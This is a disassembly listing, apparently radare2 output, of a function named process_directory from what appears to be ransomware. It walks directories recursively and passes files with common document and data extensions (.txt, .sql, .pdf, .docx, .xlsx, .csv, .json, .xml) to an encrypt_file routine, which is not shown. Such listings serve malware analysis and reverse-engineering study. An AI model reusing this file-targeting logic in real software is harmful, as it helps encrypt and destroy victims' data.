            ; CALL XREF from sym.process_directory @ 0x15c8
            ; CALL XREF from main @ 0x1772
┌ 626: sym.process_directory (int64_t arg1, int64_t arg2);
│           ; var int64_t var_420h @ rbp-0x420
│           ; var int64_t var_418h @ rbp-0x418
│           ; var int64_t var_410h @ rbp-0x410
│           ; var int64_t var_10h @ rbp-0x10
│           ; var int64_t var_8h @ rbp-0x8
│           ; arg int64_t arg1 @ rdi
│           ; arg int64_t arg2 @ rsi
│           0x000014d4      55             push rbp
│           0x000014d5      4889e5         mov rbp, rsp
│           0x000014d8      4881ec200400.  sub rsp, 0x420
│           0x000014df      4889bde8fbff.  mov qword [var_418h], rdi   ; arg1
│           0x000014e6      4889b5e0fbff.  mov qword [var_420h], rsi   ; arg2
│           0x000014ed      488b85e8fbff.  mov rax, qword [var_418h]
│           0x000014f4      4889c7         mov rdi, rax
│           0x000014f7      e874fbffff     call sym.imp.opendir
│           0x000014fc      488945f8       mov qword [var_8h], rax
│           0x00001500      48837df800     cmp qword [var_8h], 0
│       ┌─< 0x00001505      0f8512020000   jne 0x171d
│       │   0x0000150b      488b85e8fbff.  mov rax, qword [var_418h]
│       │   0x00001512      4889c6         mov rsi, rax
│       │   0x00001515      488d05fe0b00.  lea rax, str.Error_opening_directory:__s_n ; 0x211a ; "Error opening directory: %s\n"
│       │   0x0000151c      4889c7         mov rdi, rax
│       │   0x0000151f      b800000000     mov eax, 0
│       │   0x00001524      e867fbffff     call sym.imp.printf         ; int printf(const char *format)
│      ┌──< 0x00001529      e916020000     jmp 0x1744
│     ┌───> 0x0000152e      488b45f0       mov rax, qword [var_10h]
│     ╎││   0x00001532      4883c013       add rax, 0x13
│     ╎││   0x00001536      488d15fa0b00.  lea rdx, [0x00002137]       ; "."
│     ╎││   0x0000153d      4889d6         mov rsi, rdx
│     ╎││   0x00001540      4889c7         mov rdi, rax
│     ╎││   0x00001543      e888fbffff     call sym.imp.strcmp         ; int strcmp(const char *s1, const char *s2)
│     ╎││   0x00001548      85c0           test eax, eax
│    ┌────< 0x0000154a      0f84cd010000   je 0x171d
│    │╎││   0x00001550      488b45f0       mov rax, qword [var_10h]
│    │╎││   0x00001554      4883c013       add rax, 0x13
│    │╎││   0x00001558      488d15da0b00.  lea rdx, [0x00002139]       ; ".."
│    │╎││   0x0000155f      4889d6         mov rsi, rdx
│    │╎││   0x00001562      4889c7         mov rdi, rax
│    │╎││   0x00001565      e866fbffff     call sym.imp.strcmp         ; int strcmp(const char *s1, const char *s2)
│    │╎││   0x0000156a      85c0           test eax, eax
│   ┌─────< 0x0000156c      7505           jne 0x1573
│  ┌──────< 0x0000156e      e9aa010000     jmp 0x171d
│  │└─────> 0x00001573      488b45f0       mov rax, qword [var_10h]
│  │ │╎││   0x00001577      488d4813       lea rcx, [rax + 0x13]
│  │ │╎││   0x0000157b      488b95e8fbff.  mov rdx, qword [var_418h]
│  │ │╎││   0x00001582      488d85f0fbff.  lea rax, [var_410h]
│  │ │╎││   0x00001589      4989c8         mov r8, rcx
│  │ │╎││   0x0000158c      4889d1         mov rcx, rdx
│  │ │╎││   0x0000158f      488d15a60b00.  lea rdx, str._s__s          ; 0x213c ; "%s/%s"
│  │ │╎││   0x00001596      be00040000     mov esi, 0x400
│  │ │╎││   0x0000159b      4889c7         mov rdi, rax
│  │ │╎││   0x0000159e      b800000000     mov eax, 0
│  │ │╎││   0x000015a3      e808fbffff     call sym.imp.snprintf       ; int snprintf(char *s, size_t size, const char *format, ...)
│  │ │╎││   0x000015a8      488b45f0       mov rax, qword [var_10h]
│  │ │╎││   0x000015ac      0fb64012       movzx eax, byte [rax + 0x12]
│  │ │╎││   0x000015b0      3c04           cmp al, 4
│  │┌─────< 0x000015b2      751e           jne 0x15d2
│  │││╎││   0x000015b4      488b95e0fbff.  mov rdx, qword [var_420h]
│  │││╎││   0x000015bb      488d85f0fbff.  lea rax, [var_410h]
│  │││╎││   0x000015c2      4889d6         mov rsi, rdx
│  │││╎││   0x000015c5      4889c7         mov rdi, rax
│  │││╎││   0x000015c8      e807ffffff     call sym.process_directory
│ ┌───────< 0x000015cd      e94b010000     jmp 0x171d
│ ││└─────> 0x000015d2      488b45f0       mov rax, qword [var_10h]
│ ││ │╎││   0x000015d6      0fb64012       movzx eax, byte [rax + 0x12]
│ ││ │╎││   0x000015da      3c08           cmp al, 8
│ ││┌─────< 0x000015dc      0f853b010000   jne 0x171d
│ ││││╎││   0x000015e2      488b45f0       mov rax, qword [var_10h]
│ ││││╎││   0x000015e6      4883c013       add rax, 0x13
│ ││││╎││   0x000015ea      488d15510b00.  lea rdx, str..txt           ; 0x2142 ; ".txt"
│ ││││╎││   0x000015f1      4889d6         mov rsi, rdx
│ ││││╎││   0x000015f4      4889c7         mov rdi, rax
│ ││││╎││   0x000015f7      e844fbffff     call sym.imp.strstr         ; char *strstr(const char *s1, const char *s2)
│ ││││╎││   0x000015fc      4885c0         test rax, rax
│ ────────< 0x000015ff      0f85e1000000   jne 0x16e6
│ ││││╎││   0x00001605      488b45f0       mov rax, qword [var_10h]
│ ││││╎││   0x00001609      4883c013       add rax, 0x13
│ ││││╎││   0x0000160d      488d15330b00.  lea rdx, str..sql           ; 0x2147 ; ".sql"
│ ││││╎││   0x00001614      4889d6         mov rsi, rdx
│ ││││╎││   0x00001617      4889c7         mov rdi, rax
│ ││││╎││   0x0000161a      e821fbffff     call sym.imp.strstr         ; char *strstr(const char *s1, const char *s2)
│ ││││╎││   0x0000161f      4885c0         test rax, rax
│ ────────< 0x00001622      0f85be000000   jne 0x16e6
│ ││││╎││   0x00001628      488b45f0       mov rax, qword [var_10h]
│ ││││╎││   0x0000162c      4883c013       add rax, 0x13
│ ││││╎││   0x00001630      488d15150b00.  lea rdx, str..pdf           ; 0x214c ; ".pdf"
│ ││││╎││   0x00001637      4889d6         mov rsi, rdx
│ ││││╎││   0x0000163a      4889c7         mov rdi, rax
│ ││││╎││   0x0000163d      e8fefaffff     call sym.imp.strstr         ; char *strstr(const char *s1, const char *s2)
│ ││││╎││   0x00001642      4885c0         test rax, rax
│ ────────< 0x00001645      0f859b000000   jne 0x16e6
│ ││││╎││   0x0000164b      488b45f0       mov rax, qword [var_10h]
│ ││││╎││   0x0000164f      4883c013       add rax, 0x13
│ ││││╎││   0x00001653      488d15f70a00.  lea rdx, str..docx          ; 0x2151 ; ".docx"
│ ││││╎││   0x0000165a      4889d6         mov rsi, rdx
│ ││││╎││   0x0000165d      4889c7         mov rdi, rax
│ ││││╎││   0x00001660      e8dbfaffff     call sym.imp.strstr         ; char *strstr(const char *s1, const char *s2)
│ ││││╎││   0x00001665      4885c0         test rax, rax
│ ────────< 0x00001668      757c           jne 0x16e6
│ ││││╎││   0x0000166a      488b45f0       mov rax, qword [var_10h]
│ ││││╎││   0x0000166e      4883c013       add rax, 0x13
│ ││││╎││   0x00001672      488d15de0a00.  lea rdx, str..xlsx          ; 0x2157 ; ".xlsx"
│ ││││╎││   0x00001679      4889d6         mov rsi, rdx
│ ││││╎││   0x0000167c      4889c7         mov rdi, rax
│ ││││╎││   0x0000167f      e8bcfaffff     call sym.imp.strstr         ; char *strstr(const char *s1, const char *s2)
│ ││││╎││   0x00001684      4885c0         test rax, rax
│ ────────< 0x00001687      755d           jne 0x16e6
│ ││││╎││   0x00001689      488b45f0       mov rax, qword [var_10h]
│ ││││╎││   0x0000168d      4883c013       add rax, 0x13
│ ││││╎││   0x00001691      488d15c50a00.  lea rdx, str..csv           ; 0x215d ; ".csv"
│ ││││╎││   0x00001698      4889d6         mov rsi, rdx
│ ││││╎││   0x0000169b      4889c7         mov rdi, rax
│ ││││╎││   0x0000169e      e89dfaffff     call sym.imp.strstr         ; char *strstr(const char *s1, const char *s2)
│ ││││╎││   0x000016a3      4885c0         test rax, rax
│ ────────< 0x000016a6      753e           jne 0x16e6
│ ││││╎││   0x000016a8      488b45f0       mov rax, qword [var_10h]
│ ││││╎││   0x000016ac      4883c013       add rax, 0x13
│ ││││╎││   0x000016b0      488d15ab0a00.  lea rdx, str..json          ; 0x2162 ; ".json"
│ ││││╎││   0x000016b7      4889d6         mov rsi, rdx
│ ││││╎││   0x000016ba      4889c7         mov rdi, rax
│ ││││╎││   0x000016bd      e87efaffff     call sym.imp.strstr         ; char *strstr(const char *s1, const char *s2)
│ ││││╎││   0x000016c2      4885c0         test rax, rax
│ ────────< 0x000016c5      751f           jne 0x16e6
│ ││││╎││   0x000016c7      488b45f0       mov rax, qword [var_10h]
│ ││││╎││   0x000016cb      4883c013       add rax, 0x13
│ ││││╎││   0x000016cf      488d15920a00.  lea rdx, str..xml           ; 0x2168 ; ".xml"
│ ││││╎││   0x000016d6      4889d6         mov rsi, rdx
│ ││││╎││   0x000016d9      4889c7         mov rdi, rax
│ ││││╎││   0x000016dc      e85ffaffff     call sym.imp.strstr         ; char *strstr(const char *s1, const char *s2)
│ ││││╎││   0x000016e1      4885c0         test rax, rax
│ ────────< 0x000016e4      7437           je 0x171d
│ ────────> 0x000016e6      488d85f0fbff.  lea rax, [var_410h]
│ ││││╎││   0x000016ed      4889c6         mov rsi, rax
│ ││││╎││   0x000016f0      488d05760a00.  lea rax, str.Encrypting:__s_n ; 0x216d ; "Encrypting: %s\n"
│ ││││╎││   0x000016f7      4889c7         mov rdi, rax
│ ││││╎││   0x000016fa      b800000000     mov eax, 0
│ ││││╎││   0x000016ff      e88cf9ffff     call sym.imp.printf         ; int printf(const char *format)
│ ││││╎││   0x00001704      488b95e0fbff.  mov rdx, qword [var_420h]
│ ││││╎││   0x0000170b      488d85f0fbff.  lea rax, [var_410h]
│ ││││╎││   0x00001712      4889d6         mov rsi, rdx
│ ││││╎││   0x00001715      4889c7         mov rdi, rax
│ ││││╎││   0x00001718      e82cfbffff     call sym.encrypt_file
│ ││││╎││   ; CODE XREFS from sym.process_directory @ 0x156e, 0x15cd
│ └└└└──└─> 0x0000171d      488b45f8       mov rax, qword [var_8h]
│     ╎│    0x00001721      4889c7         mov rdi, rax
│     ╎│    0x00001724      e8c7f9ffff     call sym.imp.readdir
│     ╎│    0x00001729      488945f0       mov qword [var_10h], rax
│     ╎│    0x0000172d      48837df000     cmp qword [var_10h], 0
│     └───< 0x00001732      0f85f6fdffff   jne 0x152e
│      │    0x00001738      488b45f8       mov rax, qword [var_8h]
│      │    0x0000173c      4889c7         mov rdi, rax
│      │    0x0000173f      e87cf9ffff     call sym.imp.closedir
│      │    ; CODE XREF from sym.process_directory @ 0x1529
│      └──> 0x00001744      c9             leave
└           0x00001745      c3             ret
